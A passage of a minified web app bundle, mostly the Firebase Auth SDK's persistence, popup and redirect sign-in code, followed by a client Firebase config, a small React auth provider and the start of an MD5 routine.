this._withPendingWrite(async()=>(await this._withRetries(r=>fI(r,e,t)),this.localCache[e]=t,this.notifyServiceWorker(e)))}async _get(e){const t=await this._withRetries(r=>G8(r,e));return this.localCache[e]=t,t}async _remove(e){return this._withPendingWrite(async()=>(await this._withRetries(t=>dI(t,e)),delete this.localCache[e],this.notifyServiceWorker(e)))}async _poll(){const e=await this._withRetries(i=>{const s=Vp(i,!1).getAll();return new fh(s).toPromise()});if(!e)return[];if(this.pendingWrites!==0)return[];const t=[],r=new Set;if(e.length!==0)for(const{fbase_key:i,value:s}of e)r.add(i),JSON.stringify(this.localCache[i])!==JSON.stringify(s)&&(this.notifyListeners(i,s),t.push(i));for(const i of Object.keys(this.localCache))this.localCache[i]&&!r.has(i)&&(this.notifyListeners(i,null),t.push(i));return t}notifyListeners(e,t){this.localCache[e]=t;const r=this.listeners[e];if(r)for(const i of Array.from(r))i(t)}startPolling(){this.stopPolling(),this.pollTimer=setInterval(async()=>this._poll(),Q8)}stopPolling(){this.pollTimer&&(clearInterval(this.pollTimer),this.pollTimer=null)}_addListener(e,t){Object.keys(this.listeners).length===0&&this.startPolling(),this.listeners[e]||(this.listeners[e]=new Set,this._get(e)),this.listeners[e].add(t)}_removeListener(e,t){this.listeners[e]&&(this.listeners[e].delete(t),this.listeners[e].size===0&&delete this.listeners[e]),Object.keys(this.listeners).length===0&&this.stopPolling()}}L2.type="LOCAL";const Z8=L2;new uh(3e4,6e4);/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function J8(n,e){return e?Xi(e):(Re(n._popupRedirectResolver,n,"argument-error"),n._popupRedirectResolver)}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class _v extends yv{constructor(e){super("custom","custom"),this.params=e}_getIdTokenResponse(e){return yl(e,this._buildIdpRequest())}_linkToIdToken(e,t){return yl(e,this._buildIdpRequest(t))}_getReauthenticationResolver(e){return yl(e,this._buildIdpRequest())}_buildIdpRequest(e){const t={requestUri:this.params.requestUri,sessionId:this.params.sessionId,postBody:this.params.postBody,tenantId:this.params.tenantId,pendingToken:this.params.pendingToken,returnSecureToken:!0,returnIdpCredential:!0};return e&&(t.idToken=e),t}}function X8(n){return b2(n.auth,new _v(n),n.bypassAuthState)}function ej(n){const{auth:e,user:t}=n;return Re(t,e,"internal-error"),C8(t,new _v(n),n.bypassAuthState)}async function tj(n){const{auth:e,user:t}=n;return Re(t,e,"internal-error"),k8(t,new _v(n),n.bypassAuthState)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class D2{constructor(e,t,r,i,s=!1){this.auth=e,this.resolver=r,this.user=i,this.bypassAuthState=s,this.pendingPromise=null,this.eventManager=null,this.filter=Array.isArray(t)?t:[t]}execute(){return new Promise(async(e,t)=>{this.pendingPromise={resolve:e,reject:t};try{this.eventManager=await this.resolver._initialize(this.auth),await this.onExecution(),this.eventManager.registerConsumer(this)}catch(r){this.reject(r)}})}async onAuthEvent(e){const{urlResponse:t,sessionId:r,postBody:i,tenantId:s,error:o,type:a}=e;if(o){this.reject(o);return}const l={auth:this.auth,requestUri:t,sessionId:r,tenantId:s||void 0,postBody:i||void 0,user:this.user,bypassAuthState:this.bypassAuthState};try{this.resolve(await this.getIdpTask(a)(l))}catch(u){this.reject(u)}}onError(e){this.reject(e)}getIdpTask(e){switch(e){case"signInViaPopup":case"signInViaRedirect":return X8;case"linkViaPopup":case"linkViaRedirect":return tj;case"reauthViaPopup":case"reauthViaRedirect":return ej;default:pi(this.auth,"internal-error")}}resolve(e){hs(this.pendingPromise,"Pending promise was never set"),this.pendingPromise.resolve(e),this.unregisterAndCleanUp()}reject(e){hs(this.pendingPromise,"Pending promise was never set"),this.pendingPromise.reject(e),this.unregisterAndCleanUp()}unregisterAndCleanUp(){this.eventManager&&this.eventManager.unregisterConsumer(this),this.pendingPromise=null,this.cleanUp()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const nj=new uh(2e3,1e4);class sl extends D2{constructor(e,t,r,i,s){super(e,t,i,s),this.provider=r,this.authWindow=null,this.pollId=null,sl.currentPopupAction&&sl.currentPopupAction.cancel(),sl.currentPopupAction=this}async executeNotNull(){const e=await this.execute();return Re(e,this.auth,"internal-error"),e}async onExecution(){hs(this.filter.length===1,"Popup operations only handle one event");const e=vv();this.authWindow=await this.resolver._openPopup(this.auth,this.provider,this.filter[0],e),this.authWindow.associatedEvent=e,this.resolver._originValidation(this.auth).catch(t=>{this.reject(t)}),this.resolver._isIframeWebStorageSupported(this.auth,t=>{t||this.reject(Ti(this.auth,"web-storage-unsupported"))}),this.pollUserCancellation()}get eventId(){var e;return((e=this.authWindow)===null||e===void 0?void 0:e.associatedEvent)||null}cancel(){this.reject(Ti(this.auth,"cancelled-popup-request"))}cleanUp(){this.authWindow&&this.authWindow.close(),this.pollId&&window.clearTimeout(this.pollId),this.authWindow=null,this.pollId=null,sl.currentPopupAction=null}pollUserCancellation(){const e=()=>{var t,r;if(!((r=(t=this.authWindow)===null||t===void 0?void 0:t.window)===null||r===void 0)&&r.closed){this.pollId=window.setTimeout(()=>{this.pollId=null,this.reject(Ti(this.auth,"popup-closed-by-user"))},8e3);return}this.pollId=window.setTimeout(e,nj.get())};e()}}sl.currentPopupAction=null;/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const rj="pendingRedirect",Nf=new Map;class ij extends D2{constructor(e,t,r=!1){super(e,["signInViaRedirect","linkViaRedirect","reauthViaRedirect","unknown"],t,void 0,r),this.eventId=null}async execute(){let e=Nf.get(this.auth._key());if(!e){try{const r=await sj(this.resolver,this.auth)?await super.execute():null;e=()=>Promise.resolve(r)}catch(t){e=()=>Promise.reject(t)}Nf.set(this.auth._key(),e)}return this.bypassAuthState||Nf.set(this.auth._key(),()=>Promise.resolve(null)),e()}async onAuthEvent(e){if(e.type==="signInViaRedirect")return super.onAuthEvent(e);if(e.type==="unknown"){this.resolve(null);return}if(e.eventId){const t=await this.auth._redirectUserForId(e.eventId);if(t)return this.user=t,super.onAuthEvent(e);this.resolve(null)}}async onExecution(){}cleanUp(){}}async function sj(n,e){const t=lj(e),r=aj(n);if(!await r._isAvailable())return!1;const i=await r._get(t)==="true";return await r._remove(t),i}function oj(n,e){Nf.set(n._key(),e)}function aj(n){return Xi(n._redirectPersistence)}function lj(n){return Mf(rj,n.config.apiKey,n.name)}async function cj(n,e,t=!1){if(ii(n.app))return Promise.reject(ro(n));const r=tc(n),i=J8(r,e),o=await new ij(r,i,t).execute();return o&&!t&&(delete o.user._redirectEventId,await r._persistUserIfCurrent(o.user),await r._setRedirectUser(null,e)),o}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const uj=10*60*1e3;class hj{constructor(e){this.auth=e,this.cachedEventUids=new Set,this.consumers=new Set,this.queuedRedirectEvent=null,this.hasHandledPotentialRedirect=!1,this.lastProcessedEventTime=Date.now()}registerConsumer(e){this.consumers.add(e),this.queuedRedirectEvent&&this.isEventForConsumer(this.queuedRedirectEvent,e)&&(this.sendToConsumer(this.queuedRedirectEvent,e),this.saveEventToCache(this.queuedRedirectEvent),this.queuedRedirectEvent=null)}unregisterConsumer(e){this.consumers.delete(e)}onEvent(e){if(this.hasEventBeenHandled(e))return!1;let t=!1;return this.consumers.forEach(r=>{this.isEventForConsumer(e,r)&&(t=!0,this.sendToConsumer(e,r),this.saveEventToCache(e))}),this.hasHandledPotentialRedirect||!fj(e)||(this.hasHandledPotentialRedirect=!0,t||(this.queuedRedirectEvent=e,t=!0)),t}sendToConsumer(e,t){var r;if(e.error&&!O2(e)){const i=((r=e.error.code)===null||r===void 0?void 0:r.split("auth/")[1])||"internal-error";t.onError(Ti(this.auth,i))}else t.onAuthEvent(e)}isEventForConsumer(e,t){const r=t.eventId===null||!!e.eventId&&e.eventId===t.eventId;return t.filter.includes(e.type)&&r}hasEventBeenHandled(e){return Date.now()-this.lastProcessedEventTime>=uj&&this.cachedEventUids.clear(),this.cachedEventUids.has(pI(e))}saveEventToCache(e){this.cachedEventUids.add(pI(e)),this.lastProcessedEventTime=Date.now()}}function pI(n){return[n.type,n.eventId,n.sessionId,n.tenantId].filter(e=>e).join("-")}function O2({type:n,error:e}){return n==="unknown"&&(e==null?void 0:e.code)==="auth/no-auth-event"}function fj(n){switch(n.type){case"signInViaRedirect":case"linkViaRedirect":case"reauthViaRedirect":return!0;case"unknown":return O2(n);default:return!1}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function dj(n,e={}){return vo(n,"GET","/v1/projects",e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const pj=/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/,gj=/^https?/;async function mj(n){if(n.config.emulator)return;const{authorizedDomains:e}=await dj(n);for(const t of e)try{if(yj(t))return}catch{}pi(n,"unauthorized-domain")}function yj(n){const e=cy(),{protocol:t,hostname:r}=new URL(e);if(n.startsWith("chrome-extension://")){const o=new URL(n);return o.hostname===""&&r===""?t==="chrome-extension:"&&n.replace("chrome-extension://","")===e.replace("chrome-extension://",""):t==="chrome-extension:"&&o.hostname===r}if(!gj.test(t))return!1;if(pj.test(n))return r===n;const i=n.replace(/\./g,"\\.");return new RegExp("^(.+\\."+i+"|"+i+")$","i").test(r)}/**
 * @license
 * Copyright 2020 Google LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const wj=new uh(3e4,6e4);function gI(){const n=Ai().___jsl;if(n!=null&&n.H){for(const e of Object.keys(n.H))if(n.H[e].r=n.H[e].r||[],n.H[e].L=n.H[e].L||[],n.H[e].r=[...n.H[e].L],n.CP)for(let t=0;t<n.CP.length;t++)n.CP[t]=null}}function vj(n){return new Promise((e,t)=>{var r,i,s;function o(){gI(),gapi.load("gapi.iframes",{callback:()=>{e(gapi.iframes.getContext())},ontimeout:()=>{gI(),t(Ti(n,"network-request-failed"))},timeout:wj.get()})}if(!((i=(r=Ai().gapi)===null||r===void 0?void 0:r.iframes)===null||i===void 0)&&i.Iframe)e(gapi.iframes.getContext());else if(!((s=Ai().gapi)===null||s===void 0)&&s.load)o();else{const a=h8("iframefcb");return Ai()[a]=()=>{gapi.load?o():t(Ti(n,"network-request-failed"))},E2(`${u8()}?onload=${a}`).catch(l=>t(l))}}).catch(e=>{throw Pf=null,e})}let Pf=null;function _j(n){return Pf=Pf||vj(n),Pf}/**
 * @license
 * Copyright 2020 Google LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Ej=new uh(5e3,15e3),Ij="__/auth/iframe",Sj="emulator/auth/iframe",Tj={style:{position:"absolute",top:"-100px",width:"1px",height:"1px"},"aria-hidden":"true",tabindex:"-1"},Aj=new Map([["identitytoolkit.googleapis.com","p"],["staging-identitytoolkit.sandbox.googleapis.com","s"],["test-identitytoolkit.sandbox.googleapis.com","t"]]);function bj(n){const e=n.config;Re(e.authDomain,n,"auth-domain-config-required");const t=e.emulator?pv(e,Sj):`https://${n.config.authDomain}/${Ij}`,r={apiKey:e.apiKey,appName:n.name,v:ec},i=Aj.get(n.config.apiHost);i&&(r.eid=i);const s=n._getFrameworks();return s.length&&(r.fw=s.join(",")),`${t}?${ch(r).slice(1)}`}async function xj(n){const e=await _j(n),t=Ai().gapi;return Re(t,n,"internal-error"),e.open({where:document.body,url:bj(n),messageHandlersFilter:t.iframes.CROSS_ORIGIN_IFRAMES_FILTER,attributes:Tj,dontclear:!0},r=>new Promise(async(i,s)=>{await r.restyle({setHideOnLeave:!1});const o=Ti(n,"network-request-failed"),a=Ai().setTimeout(()=>{s(o)},Ej.get());function l(){Ai().clearTimeout(a),i(r)}r.ping(l).then(l,()=>{s(o)})}))}/**
 * @license
 * Copyright 2020 Google LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const kj={location:"yes",resizable:"yes",statusbar:"yes",toolbar:"no"},Cj=500,Rj=600,Mj="_blank",Nj="http://localhost";class mI{constructor(e){this.window=e,this.associatedEvent=null}close(){if(this.window)try{this.window.close()}catch{}}}function Pj(n,e,t,r=Cj,i=Rj){const s=Math.max((window.screen.availHeight-i)/2,0).toString(),o=Math.max((window.screen.availWidth-r)/2,0).toString();let a="";const l=Object.assign(Object.assign({},kj),{width:r.toString(),height:i.toString(),top:s,left:o}),u=nr().toLowerCase();t&&(a=p2(u)?Mj:t),f2(u)&&(e=e||Nj,l.scrollbars="yes");const h=Object.entries(l).reduce((m,[v,x])=>`${m}${v}=${x},`,"");if(t8(u)&&a!=="_self")return Lj(e||"",a),new mI(null);const f=window.open(e||"",a,h);Re(f,n,"popup-blocked");try{f.focus()}catch{}return new mI(f)}function Lj(n,e){const t=document.createElement("a");t.href=n,t.target=e;const r=document.createEvent("MouseEvent");r.initMouseEvent("click",!0,!0,window,1,0,0,0,0,!1,!1,!1,!1,1,null),t.dispatchEvent(r)}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Dj="__/auth/handler",Oj="emulator/auth/handler",Bj=encodeURIComponent("fac");async function yI(n,e,t,r,i,s){Re(n.config.authDomain,n,"auth-domain-config-required"),Re(n.config.apiKey,n,"invalid-api-key");const o={apiKey:n.config.apiKey,appName:n.name,authType:t,redirectUrl:r,v:ec,eventId:i};if(e instanceof T2){e.setDefaultLanguage(n.languageCode),o.providerId=e.providerId||"",S5(e.getCustomParameters())||(o.customParameters=JSON.stringify(e.getCustomParameters()));for(const[h,f]of Object.entries(s||{}))o[h]=f}if(e instanceof hh){const h=e.getScopes().filter(f=>f!=="");h.length>0&&(o.scopes=h.join(","))}n.tenantId&&(o.tid=n.tenantId);const a=o;for(const h of Object.keys(a))a[h]===void 0&&delete a[h];const l=await n._getAppCheckToken(),u=l?`#${Bj}=${encodeURIComponent(l)}`:"";return`${Uj(n)}?${ch(a).slice(1)}${u}`}function Uj({config:n}){return n.emulator?pv(n,Oj):`https://${n.authDomain}/${Dj}`}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Tm="webStorageSupport";class jj{constructor(){this.eventManagers={},this.iframes={},this.originValidationPromises={},this._redirectPersistence=R2,this._completeRedirectFn=cj,this._overrideRedirectResult=oj}async _openPopup(e,t,r,i){var s;hs((s=this.eventManagers[e._key()])===null||s===void 0?void 0:s.manager,"_initialize() not called before _openPopup()");const o=await yI(e,t,r,cy(),i);return Pj(e,o,vv())}async _openRedirect(e,t,r,i){await this._originValidation(e);const s=await yI(e,t,r,cy(),i);return z8(s),new Promise(()=>{})}_initialize(e){const t=e._key();if(this.eventManagers[t]){const{manager:i,promise:s}=this.eventManagers[t];return i?Promise.resolve(i):(hs(s,"If manager is not set, promise should be"),s)}const r=this.initAndGetManager(e);return this.eventManagers[t]={promise:r},r.catch(()=>{delete this.eventManagers[t]}),r}async initAndGetManager(e){const t=await xj(e),r=new hj(e);return t.register("authEvent",i=>(Re(i==null?void 0:i.authEvent,e,"invalid-auth-event"),{status:r.onEvent(i.authEvent)?"ACK":"ERROR"}),gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTER),this.eventManagers[e._key()]={manager:r},this.iframes[e._key()]=t,r}_isIframeWebStorageSupported(e,t){this.iframes[e._key()].send(Tm,{type:Tm},i=>{var s;const o=(s=i==null?void 0:i[0])===null||s===void 0?void 0:s[Tm];o!==void 0&&t(!!o),pi(e,"internal-error")},gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTER)}_originValidation(e){const t=e._key();return this.originValidationPromises[t]||(this.originValidationPromises[t]=mj(e)),this.originValidationPromises[t]}get _shouldInitProactively(){return v2()||d2()||mv()}}const Vj=jj;var wI="@firebase/auth",vI="1.10.0";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Fj{constructor(e){this.auth=e,this.internalListeners=new Map}getUid(){var e;return this.assertAuthConfigured(),((e=this.auth.currentUser)===null||e===void 0?void 0:e.uid)||null}async getToken(e){return this.assertAuthConfigured(),await this.auth._initializationPromise,this.auth.currentUser?{accessToken:await this.auth.currentUser.getIdToken(e)}:null}addAuthTokenListener(e){if(this.assertAuthConfigured(),this.internalListeners.has(e))return;const t=this.auth.onIdTokenChanged(r=>{e((r==null?void 0:r.stsTokenManager.accessToken)||null)});this.internalListeners.set(e,t),this.updateProactiveRefresh()}removeAuthTokenListener(e){this.assertAuthConfigured();const t=this.internalListeners.get(e);t&&(this.internalListeners.delete(e),t(),this.updateProactiveRefresh())}assertAuthConfigured(){Re(this.auth._initializationPromise,"dependent-sdk-initialized-before-auth")}updateProactiveRefresh(){this.internalListeners.size>0?this.auth._startProactiveRefresh():this.auth._stopProactiveRefresh()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function zj(n){switch(n){case"Node":return"node";case"ReactNative":return"rn";case"Worker":return"webworker";case"Cordova":return"cordova";case"WebExtension":return"web-extension";default:return}}function Wj(n){Dl(new sa("auth",(e,{options:t})=>{const r=e.getProvider("app").getImmediate(),i=e.getProvider("heartbeat"),s=e.getProvider("app-check-internal"),{apiKey:o,authDomain:a}=r.options;Re(o&&!o.includes(":"),"invalid-api-key",{appName:r.name});const l={apiKey:o,authDomain:a,clientPlatform:n,apiHost:"identitytoolkit.googleapis.com",tokenApiHost:"securetoken.googleapis.com",apiScheme:"https",sdkClientVersion:_2(n)},u=new a8(r,i,s,l);return y8(u,t),u},"PUBLIC").setInstantiationMode("EXPLICIT").setInstanceCreatedCallback((e,t,r)=>{e.getProvider("auth-internal").initialize()})),Dl(new sa("auth-internal",e=>{const t=tc(e.getProvider("auth").getImmediate());return(r=>new Fj(r))(t)},"PRIVATE").setInstantiationMode("EXPLICIT")),no(wI,vI,zj(n)),no(wI,vI,"esm2017")}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const $j=5*60,Hj=Jx("authIdTokenMaxAge")||$j;let _I=null;const qj=n=>async e=>{const t=e&&await e.getIdTokenResult(),r=t&&(new Date().getTime()-Date.parse(t.issuedAtTime))/1e3;if(r&&r>Hj)return;const i=t==null?void 0:t.token;_I!==i&&(_I=i,await fetch(n,{method:i?"POST":"DELETE",headers:i?{Authorization:`Bearer ${i}`}:{}}))};function B2(n=t2()){const e=hv(n,"auth");if(e.isInitialized())return e.getImmediate();const t=m8(n,{popupRedirectResolver:Vj,persistence:[Z8,j8,R2]}),r=Jx("authTokenSyncURL");if(r&&typeof isSecureContext=="boolean"&&isSecureContext){const s=new URL(r,location.origin);if(location.origin===s.origin){const o=qj(s.toString());L8(t,o,()=>o(t.currentUser)),P8(t,a=>o(a))}}const i=Yx("auth");return i&&w8(t,`http://${i}`),t}function Kj(){var n,e;return(e=(n=document.getElementsByTagName("head"))===null||n===void 0?void 0:n[0])!==null&&e!==void 0?e:document}l8({loadJS(n){return new Promise((e,t)=>{const r=document.createElement("script");r.setAttribute("src",n),r.onload=e,r.onerror=i=>{const s=Ti("internal-error");s.customData=i,t(s)},r.type="text/javascript",r.charset="UTF-8",Kj().appendChild(r)})},gapiScript:"https://apis.google.com/js/api.js",recaptchaV2Script:"https://www.google.com/recaptcha/api.js",recaptchaEnterpriseScript:"https://www.google.com/recaptcha/enterprise.js?render="});Wj("Browser");var Gj="firebase",Qj="11.6.0";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */no(Gj,Qj,"app");const Yj={apiKey:"AIzaSyCYOFhmThtA_5F9h67lGPLXuO0ZZixy29o",authDomain:"mage-trump-token.firebaseapp.com",databaseURL:"https://mage-trump-token-default-rtdb.firebaseio.com",projectId:"mage-trump-token",storageBucket:"mage-trump-token.firebasestorage.app",messagingSenderId:"974753040843",appId:"1:974753040843:web:8de9a9f42ac4f24550ce4e"},Zj=Op(Yj),Am=B2(Zj),Jj=Y.createContext(),Xj=({children:n})=>{const[e,t]=Y.useState(null),[r,i]=Y.useState(!0);Y.useEffect(()=>D8(Am,a=>{t(a),i(!1)}),[]);const s=(a,l)=>N8(Am,a,l),o=()=>O8(Am);return te.jsx(Jj.Provider,{value:{user:e,login:s,logout:o},children:!r&&n})},eV=""+new URL("front-6e9bd7de.png",import.meta.url).href;var EI=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof globalThis<"u"?globalThis:typeof self<"u"?self:{};/** @license
Copyright The Closure Library Authors.
SPDX-License-Identifier: Apache-2.0
*/var io,U2;(function(){var n;/** @license

 Copyright The Closure Library Authors.
 SPDX-License-Identifier: Apache-2.0
*/function e(L,N){function B(){}B.prototype=N.prototype,L.D=N.prototype,L.prototype=new B,L.prototype.constructor=L,L.C=function(z,W,K){for(var T=Array(arguments.length-2),d=2;d<arguments.length;d++)T[d-2]=arguments[d];return N.prototype[W].apply(z,T)}}function t(){this.blockSize=-1}function r(){this.blockSize=-1,this.blockSize=64,this.g=Array(4),this.B=Array(this.blockSize),this.o=this.h=0,this.s()}e(r,t),r.prototype.s=function(){this.g[0]=1732584193,this.g[1]=4023233417,this.g[2]=2562383102,this.g[3]=271733878,this.o=this.h=0};function i(L,N,B){B||(B=0);var z=Array(16);if(typeof N=="string")for(var W=0;16>W;++W)z[W]=N.charCodeAt(B++)|N.charCodeAt(B++)<<8|N.charCodeAt(B++)<<16|N.charCodeAt(B++)<<24;else for(W=0;16>W;++W)z[W]=N[B++]|N[B++]<<8|N[B++]<<16|N[B++]<<24;N=L.g[0],B=L.g[1],W=L.g[2];var K=L.g[3],T=N+(K^B&(W^K))+z[0]+3614090360&4294967295;N=B+(T<<7&4294967295|T>>>25),T=K+(W^N&(B^W))+z[1]+3905402710&4294967295,K=N+(T<<12&4294967295|T>>>20),T=W+(B^K&(N^B))+z[2]+606105819&4294967295,W=K+(T<<17&4294967295|T>>>15),T=B+(N^W&(K^N))+z[3]+3250441966&4294967295,B=W+(T<<22&4294967295|T>>>10),T=N+(K^B&(W^K))+z[4]+4118548399&4294967295,N=B+(T<<7&4294967295|T>>>25),T=K+(W^N&(B^W))+z[5]+1200080426&4294967295,K=N+(T<<12&4294967295|T>>>20),T=W+(B^K&(N^B))+z[6]+2821735955&4294967295,W=K+(T<<17&4294967295|T>>>15),T=B+(N^W&(K^N))+z[7]+4249261313&4294967295,B=W+(T<<22&4294967295|T>>>10),T=N+(K^B&(W^K))+z[8]+1770035416&4294967295,N=B+(T<<7&4294967295|T>>>25),T=K+(W^N&(B^W))+z[9]+2336552879&4294967295,K=N+(T<<12&4294967295|T>>>20),T=W+(B^K&(N^B))+z[10]+4294925233&4294967295,W=K+(T<<17&4294967295|T>>>15),T=B+(N^W&(K^N))+z[11]+2304563134&4294967295,B=W+(T<<22&4294967295|T>>>10),T=N+(K^B&(W^K))+z[12]+1804603682&4294967295,N=B+(T<<7&4294967295|T>>>25),T=K+(W^N&(B^W))+z[13]+4254626195&4294967295,K=N+(T<<12&4294967295|T>>>20),T=W+(B^K&(N^B))+z[14]+2792965006&4294967295,W=K+(T<<17&4294967295|T>>>15),T=B+(N^W&(K^N))+z[15]+1236535329&4294967295,B=W+(T<<22&4294967295|T>>>10),T=N+(W^K&(B^W))+z[1]+4129170786&4294967295,N=B+(T<<5&4294967295|T>>>27),T=K+(B^W&(N^B))+z[6]+3225465664&429